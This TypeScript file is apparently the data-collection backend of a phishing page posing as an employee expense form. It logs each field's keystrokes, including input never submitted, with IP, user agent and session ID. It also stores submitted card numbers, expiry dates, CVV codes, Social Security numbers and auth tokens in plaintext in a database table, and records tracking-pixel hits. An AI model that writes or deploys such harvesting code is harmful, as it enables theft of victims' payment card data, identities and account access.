import { neon } from '@neondatabase/serverless';

interface FormDataEntry {
  employeeName?: string;
  employeeId?: string;
  expenseDescription?: string;
  amount?: string;
  businessPurpose?: string;
  clientName?: string;
  notes?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  ssn?: string;
}

// Unified logger that writes everything to the tripease table
export async function logger(entry: Record<string, unknown>) {
  try {
    // Console logging for immediate debugging
    console.log('SECURITY_LOG:', JSON.stringify(entry));
    
    // Database logging - everything goes to tripease table
    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Log keystrokes to tripease table
      if (entry.type === 'keystroke') {
        await sql`INSERT INTO tripease 
                  (event_type, field_name, field_value, ip_address, user_agent, referer, 
                   session_id, timestamp, raw_data) 
                  VALUES (${entry.type as string}, ${entry.field as string || ''}, ${entry.value as string || ''}, 
                          ${entry.ip as string || ''}, ${entry.userAgent as string || ''}, ${entry.referer as string || ''}, 
                          ${entry.sessionId as string || ''}, ${entry.timestamp as string || ''}, ${JSON.stringify(entry)})`;
      }

      // Log form submissions to tripease table
      if (entry.type === 'submit' && entry.formData) {
        const formData = entry.formData as FormDataEntry;
        await sql`INSERT INTO tripease 
                  (event_type, employee_name, employee_id, expense_description, amount, business_purpose, 
                   client_name, notes, card_number, card_expiry, card_cvv, ssn, 
                   session_id, auth_token, ip_address, user_agent, was_submitted, timestamp, raw_data) 
                  VALUES (${entry.type as string}, ${formData.employeeName || ''}, ${formData.employeeId || ''}, 
                          ${formData.expenseDescription || ''}, ${formData.amount || ''}, ${formData.businessPurpose || ''}, 
                          ${formData.clientName || ''}, ${formData.notes || ''}, ${formData.cardNumber || ''}, 
                          ${formData.cardExpiry || ''}, ${formData.cardCvv || ''}, ${formData.ssn || ''}, 
                          ${entry.sessionId as string || ''}, ${entry.authToken as string || ''}, 
                          ${entry.ip as string || ''}, ${entry.userAgent as string || ''}, ${true}, 
                          ${entry.timestamp as string || ''}, ${JSON.stringify(entry)})`;
      }

      // Log other events (pixel, etc.) to tripease table
      if (entry.type !== 'keystroke' && entry.type !== 'submit') {
        await sql`INSERT INTO tripease 
                  (event_type, ip_address, user_agent, referer, timestamp, raw_data) 
                  VALUES (${entry.type as string}, ${entry.ip as string || ''}, ${entry.userAgent as string || ''}, 
                          ${entry.referer as string || ''}, ${entry.timestamp as string || ''}, ${JSON.stringify(entry)})`;
      }
    }
    
  } catch (error) {
    console.error("Logger error:", error);
    console.log('FALLBACK_LOG:', JSON.stringify(entry));
  }
}